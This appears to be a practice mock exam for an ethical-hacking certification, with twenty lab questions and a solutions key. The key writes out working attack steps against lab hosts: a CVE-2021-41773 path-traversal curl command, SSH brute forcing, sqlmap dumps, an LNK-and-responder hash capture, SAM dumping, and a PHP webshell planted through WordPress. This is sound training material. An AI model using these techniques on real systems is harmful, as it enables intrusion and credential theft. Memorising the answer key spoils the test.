# Mock Exam 2 (Medium) — 20 Questions, 6 Hours

> Sit for 6 hours. No solutions until the end. Mark your answers in a separate text file.
> **Answer format matters — copy verbatim from tool output.**

**Targets in this mock:** `10.10.11.15`, `10.10.11.25`, `10.10.11.30`, `10.10.11.45`, `10.10.11.60`, `10.10.11.80`

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

This is the MEDIUM mock — realistic exam balance. Several questions require 2–3 steps, and two are true chains. Don't rush scanning — the first hour of careful enumeration pays for itself four times over.

---

## Question 1 (10.10.11.15)
**Domain:** 02 Scanning | **Difficulty:** 🟢 | **Time est:** 5 min

Run a version scan on the top 1000 ports of `10.10.11.15`. What version of SSH is running?

**Answer format:** `<software> <version>` (e.g. `OpenSSH 7.9p1`)

---

## Question 2 (10.10.11.15)
**Domain:** 02 Scanning | **Difficulty:** 🟡 | **Time est:** 8 min

`10.10.11.15` is running an SMTP server. Use NSE scripts to enumerate valid usernames with the built-in wordlist. Which of the following users exist? (Pick all that apply: `root`, `admin`, `alice`, `bob`, `mail`)

**Answer format:** comma-separated list (e.g. `root, mail`)

---

## Question 3 (10.10.11.15)
**Domain:** 03 Enumeration | **Difficulty:** 🟡 | **Time est:** 10 min

`10.10.11.15` runs SNMP on UDP 161 with community string `public`. What is the hostname of the machine according to SNMP sysName?

**Answer format:** hostname string

---

## Question 4 (10.10.11.15)
**Domain:** 05 System Hacking | **Difficulty:** 🟡 | **Time est:** 15 min

Brute-force SSH on `10.10.11.15` with `hydra` using the user list from Q2 and `rockyou.txt`. What is the username:password pair that works?

**Answer format:** `user:password`

---

## Question 5 (10.10.11.25)
**Domain:** 11 Web Servers | **Difficulty:** 🟢 | **Time est:** 5 min

Run `nikto` against `http://10.10.11.25/`. What is the full version of the web server?

**Answer format:** `<server> <version>` (e.g. `Apache 2.4.49`)

---

## Question 6 (10.10.11.25)
**Domain:** 11 Web Servers | **Difficulty:** 🟡 | **Time est:** 10 min

The version from Q5 is vulnerable to a path traversal CVE. Exploit it with `curl` to read `/etc/passwd`. What is the full CVE number?

**Answer format:** `CVE-YYYY-NNNNN`

---

## Question 7 (10.10.11.25)
**Domain:** 12 Web Apps | **Difficulty:** 🟡 | **Time est:** 12 min

A WordPress install exists at `http://10.10.11.25/blog/`. Run `wpscan` and identify the version number.

**Answer format:** WordPress version (e.g. `5.8.1`)

---

## Question 8 (10.10.11.25)
**Domain:** 12 Web Apps | **Difficulty:** 🟡 | **Time est:** 15 min

From the same WordPress, enumerate users. What is the username of the administrator (ID 1)?

**Answer format:** username string

---

## Question 9 (10.10.11.30)
**Domain:** 13 SQL Injection | **Difficulty:** 🟡 | **Time est:** 20 min

The search field at `http://10.10.11.30/search.php?q=test` is vulnerable. Use sqlmap to dump the DB. What is the MD5 hash of the user `manager` in the `employees` table?

**Answer format:** 32-hex MD5 string

---

## Question 10 (10.10.11.30)
**Domain:** 18 Cryptography | **Difficulty:** 🟡 | **Time est:** 10 min

Crack the MD5 hash from Q9 using `hashcat` with `rockyou.txt`. What is the cleartext password?

**Answer format:** cleartext string

---

## Question 11 (10.10.11.45)
**Domain:** 07 Sniffing | **Difficulty:** 🟡 | **Time est:** 15 min

A pcap `traffic.pcap` is provided. It contains an HTTP POST with login credentials. What is the password submitted?

**Answer format:** password string

---

## Question 12 (10.10.11.45)
**Domain:** 07 Sniffing | **Difficulty:** 🟡 | **Time est:** 10 min

In the same pcap, a file was transferred over HTTP. Extract it with Wireshark's "Export Objects" feature. What is the MD5 sum of the extracted file?

**Answer format:** 32-hex MD5 string

---

## Question 13 (10.10.11.60)
**Domain:** 03 Enumeration | **Difficulty:** 🟡 | **Time est:** 12 min

Enumerate SMB shares on `10.10.11.60` as a null session. Which share is writable?

**Answer format:** share name

---

## Question 14 (10.10.11.60)
**Domain:** 05 System Hacking | **Difficulty:** 🔴 | **Time est:** 20 min

Drop a malicious LNK file on the writable share from Q13, then capture the NTLMv2 hash of the user who opens it with `responder`. Crack it with `hashcat`. What is the cleartext password?

**Answer format:** cleartext string

---

## Question 15 (10.10.11.80)
**Domain:** 14 Wireless | **Difficulty:** 🟡 | **Time est:** 15 min

A WPA2 4-way handshake capture `corp.cap` is provided for SSID `CorpNet`. Crack the PSK with `hashcat` mode 22000 using `rockyou.txt`. What is the passphrase?

**Answer format:** passphrase string

---

## Question 16 (file)
**Domain:** 18 Cryptography / Stego | **Difficulty:** 🟡 | **Time est:** 10 min

Extract the hidden archive from `hidden.png` with `binwalk -e`. What is the filename of the extracted text file?

**Answer format:** filename with extension

---

## Question 17 (file)
**Domain:** 18 Cryptography | **Difficulty:** 🟡 | **Time est:** 12 min

The text file from Q16 contains a Base64-encoded string. Decode it twice (it's double-encoded). What is the cleartext?

**Answer format:** string verbatim

---

## Question 18 (15 Mobile)
**Domain:** 15 Mobile | **Difficulty:** 🟡 | **Time est:** 15 min

You're given an Android APK `app.apk`. Extract it and find the hardcoded API key in the strings. What is the API key value?

**Answer format:** API key string

---

## Question 19 (10.10.11.60) — CHAIN
**Domain:** Multi (03 Enum → 05 System Hacking) | **Difficulty:** 🔴 | **Time est:** 30 min

Using the cracked credential from Q14, log into `10.10.11.60` with `evil-winrm` (or `crackmapexec`). Dump the local SAM with `reg save` + `secretsdump.py` and retrieve the NTLM hash of the local Administrator. What is the Administrator's NTLM hash (just the NT portion, 32 hex chars)?

**Answer format:** 32-hex NT hash (after the colon in `LM:NT`)

---

## Question 20 (10.10.11.30 → 10.10.11.60) — CHAIN
**Domain:** Multi (13 SQLi → 12 Web Apps → 05 System Hacking) | **Difficulty:** 🔴 | **Time est:** 35 min

The WordPress admin username from Q8 reuses a password from the `employees` table dump in Q9/Q10. Log in to WordPress, edit a PHP theme file to plant a webshell, get RCE, and read `/root/flag.txt`. What is the flag?

**Answer format:** flag string verbatim

---

---

# Solutions

> Don't read below until you have finished all 20 questions and marked your answers.

---

## Q1 Solution
**Steps:**
1. `nmap -sV -p 22 10.10.11.15` ← [why -sV](../../tools/nmap.md#scan-techniques)
2. Read the VERSION column.

**Answer:** e.g. `OpenSSH 7.9p1 Debian 10+deb10u2`

**Gotcha:** CEH often wants just `OpenSSH 7.9p1`, not the Debian suffix. Try the short form first; if wrong, paste the full string.

---

## Q2 Solution
**Steps:**
1. `nmap -p 25 --script smtp-enum-users 10.10.11.15` ← [NSE scripts](../../tools/nmap.md#nse-scripts-the-money-section)
2. Alternatively, use `smtp-user-enum -M VRFY -U users.txt -t 10.10.11.15`.
3. Read `valid-users` from output.

**Answer:** e.g. `root, admin, mail`

**Gotcha:** some SMTP servers disable VRFY but allow EXPN or RCPT. The NSE script tries all three.

---

## Q3 Solution
**Steps:**
1. `snmpwalk -v2c -c public 10.10.11.15 1.3.6.1.2.1.1.5.0` ← [snmpwalk](../../tools/snmpwalk.md)
2. That OID is `sysName.0`.
3. Or: `snmpwalk -v2c -c public 10.10.11.15 system`

**Answer:** hostname string

**Gotcha:** `sysName` (1.3.6.1.2.1.1.5.0) not `sysDescr` (1.3.6.1.2.1.1.1.0). Read the question carefully.

---

## Q4 Solution
**Steps:**
1. Save Q2 users to `users.txt`.
2. `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.15 -t 4` ← [hydra](../../tools/hydra.md)
3. Wait for `login: ... password: ...`.

**Answer:** `user:password`

**Gotcha:** 
- SSH gets rate-limited — use `-t 4` max, not `-t 16`.
- Try the obvious first: `hydra -l root -P rockyou.txt ssh://...` is faster than full matrix.

---

## Q5 Solution
**Steps:**
1. `nikto -h http://10.10.11.25/` ← [nikto](../../tools/nikto.md)
2. Or: `curl -I http://10.10.11.25/` — check `Server:` header.
3. Or: `nmap -sV -p 80 10.10.11.25`

**Answer:** e.g. `Apache 2.4.49`

**Gotcha:** match the format exactly — `Apache/2.4.49` (with slash) may or may not be accepted; try the space form first.

---

## Q6 Solution
**Steps:**
1. Apache 2.4.49 → CVE-2021-41773 (path traversal).
2. `curl --path-as-is "http://10.10.11.25/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"`
3. Confirm `/etc/passwd` content returned.

**Answer:** `CVE-2021-41773`

**Gotcha:** `--path-as-is` is critical — without it curl normalizes the path and the traversal fails. Also 2.4.50 has a near-identical CVE-2021-42013 — read the version carefully.

---

## Q7 Solution
**Steps:**
1. `wpscan --url http://10.10.11.25/blog/ --no-update` ← [wpscan](../../tools/wpscan.md)
2. Read `WordPress version X.Y.Z identified`.

**Answer:** WP version

**Gotcha:** `--no-update` avoids the vuln DB update hang. Add `--random-user-agent` if 403'd.

---

## Q8 Solution
**Steps:**
1. `wpscan --url http://10.10.11.25/blog/ --enumerate u --no-update`
2. Or manually: `curl http://10.10.11.25/blog/?author=1` and read redirect.
3. ID 1 is always the first admin.

**Answer:** username string

**Gotcha:** if wpscan returns nothing, the `/?author=N` trick almost always works.

---

## Q9 Solution
**Steps:**
1. `sqlmap -u "http://10.10.11.30/search.php?q=test" --batch --dbs`
2. `sqlmap -u "..." --batch -D <db> --tables`
3. `sqlmap -u "..." --batch -D <db> -T employees --dump`
4. Find row `manager`, copy hash column.

**Answer:** 32-hex MD5

**Gotcha:** sqlmap auto-detects and may offer to crack — let it try, but also save the raw hash for Q10.

---

## Q10 Solution
**Steps:**
1. `echo <hash> > h.txt`
2. `hashcat -m 0 -a 0 h.txt /usr/share/wordlists/rockyou.txt` ← [hashcat](../../tools/hashcat.md)
3. `hashcat -m 0 h.txt --show`

**Answer:** cleartext

**Gotcha:** mode 0 = raw MD5. If you pass `-m 10` (md5($pass.$salt)) by accident it won't match.

---

## Q11 Solution
**Steps:**
1. Open `traffic.pcap` in Wireshark.
2. Filter: `http.request.method == "POST"`
3. Right-click → Follow → HTTP Stream.
4. Or CLI: `tcpdump -r traffic.pcap -A | grep -i 'password='`

**Answer:** password string

**Gotcha:** the field may be URL-encoded — decode `%40` → `@` etc.

---

## Q12 Solution
**Steps:**
1. In Wireshark: File → Export Objects → HTTP.
2. Select the file, click Save.
3. `md5sum <saved_file>`

**Answer:** 32-hex md5

**Gotcha:** tshark alternative: `tshark -r traffic.pcap --export-objects http,./out/`

---

## Q13 Solution
**Steps:**
1. `smbclient -L //10.10.11.60/ -N` ← [smbclient](../../tools/smbclient.md)
2. `smbmap -H 10.10.11.60 -u '' -p ''` ← [smbmap](../../tools/smbmap.md) — smbmap prints `READ, WRITE` per share.
3. Or: `crackmapexec smb 10.10.11.60 -u '' -p '' --shares` ← [cme](../../tools/crackmapexec.md)

**Answer:** share name (e.g. `Public`)

**Gotcha:** null session = `-u '' -p ''`. Some modern boxes require `-u 'guest'`.

---

## Q14 Solution
**Steps:**
1. Craft LNK pointing to `\\<attacker_ip>\share\file`. Python `pylnk3` or manual.
2. `smbclient //10.10.11.60/Public -N -c 'put evil.lnk'`
3. `sudo responder -I eth0` ← [responder](../../tools/responder.md)
4. Wait — when a user browses the share, Windows auto-resolves the icon path → NTLMv2 hash hits responder.
5. Copy hash from `Responder/logs/`.
6. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt` (mode 5600 = NetNTLMv2)
7. `hashcat -m 5600 hash.txt --show`

**Answer:** cleartext

**Gotcha:** 
- Mode 5600 is NTLMv2, not 1000 (plain NTLM).
- In the real exam they may pre-stage the LNK — skip to the responder step.

---

## Q15 Solution
**Steps:**
1. `hcxpcapngtool -o corp.22000 corp.cap` (convert pcap → hashcat 22000)
2. `hashcat -m 22000 corp.22000 /usr/share/wordlists/rockyou.txt`
3. `hashcat -m 22000 corp.22000 --show`
4. Or classic: `aircrack-ng -w rockyou.txt -b <BSSID> corp.cap` ← [aircrack-ng](../../tools/aircrack-ng.md)

**Answer:** passphrase

**Gotcha:** mode 22000 (new) replaces old 2500. Use whichever tool you have — aircrack is fine and doesn't need conversion.

---

## Q16 Solution
**Steps:**
1. `binwalk hidden.png` ← [binwalk](../../tools/binwalk.md)
2. `binwalk -e hidden.png` (extracts to `_hidden.png.extracted/`)
3. `ls _hidden.png.extracted/`

**Answer:** filename (e.g. `secret.txt`)

**Gotcha:** if binwalk finds nothing, try `foremost hidden.png` ← [foremost](../../tools/foremost.md). Also check EXIF with `exiftool hidden.png` ← [exiftool](../../tools/exiftool.md).

---

## Q17 Solution
**Steps:**
1. `cat secret.txt` — you'll see base64.
2. `base64 -d secret.txt` → still base64?
3. `base64 -d secret.txt | base64 -d`

**Answer:** cleartext string

**Gotcha:** `=` padding at end confirms base64. If decode gives garbage, it may be base32 or base58 — try `basenc`.

---

## Q18 Solution
**Steps:**
1. `apktool d app.apk -o app_out/`
2. `grep -r "api" app_out/res/values/strings.xml`
3. Or: `unzip app.apk && strings classes.dex | grep -i 'api_key\|apikey\|api-key'`

**Answer:** API key string

**Gotcha:** strings can also live in `smali/` bytecode. Grep broadly, then narrow.

---

## Q19 Solution — CHAIN
**Steps:**
1. `evil-winrm -i 10.10.11.60 -u <user> -p <pass>` ← [evil-winrm](../../tools/evil-winrm.md)
2. If WinRM closed, try `crackmapexec smb 10.10.11.60 -u <user> -p <pass> --sam` — cme dumps SAM directly if the user is admin.
3. Or inside a shell:
   ```
   reg save HKLM\SAM C:\Temp\sam.save
   reg save HKLM\SYSTEM C:\Temp\system.save
   ```
4. Exfil via `download` in evil-winrm or SMB put.
5. `impacket-secretsdump -sam sam.save -system system.save LOCAL` ← [impacket](../../tools/impacket.md)
6. Read `Administrator:500:aad3b435...:<NTHASH>:::`

**Answer:** 32 hex chars after the second colon

**Gotcha:** 
- `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash (always the same). Don't confuse it with the answer.
- The NT hash is the **second** 32-hex block.

---

## Q20 Solution — CHAIN
**Steps:**
1. Log into `http://10.10.11.25/blog/wp-login.php` with admin user (Q8) and a password from the Q10 dump.
2. Appearance → Theme Editor → pick `404.php` (or any template).
3. Insert: `<?php system($_GET['c']); ?>`
4. Visit: `http://10.10.11.25/blog/wp-content/themes/<theme>/404.php?c=id`
5. Confirm RCE: `?c=whoami`
6. Read flag: `?c=cat%20/root/flag.txt`
7. If `/root/flag.txt` unreadable (www-data), privesc via sudo/SUID — but usually the box places the flag in `/var/www/` or `/tmp/`.

**Answer:** flag string verbatim

**Gotcha:**
- Theme editor is often disabled (`DISALLOW_FILE_EDIT` in `wp-config.php`). If so, upload a malicious plugin zip instead: `msfvenom -p php/... > shell.php`, zip it, Plugins → Add New → Upload.
- Don't use the sqli box password literally — try variations (capitalized, with year suffix). Password reuse doesn't mean identical.

---

## End of Mock 2

**Expected score for ready candidates:** 14–18 / 20

**Expected completion time:** 5h – 5h45

When done, debrief per [`README.md`](README.md), re-drill your weakest domain, then move on to [`mock-3.md`](mock-3.md).
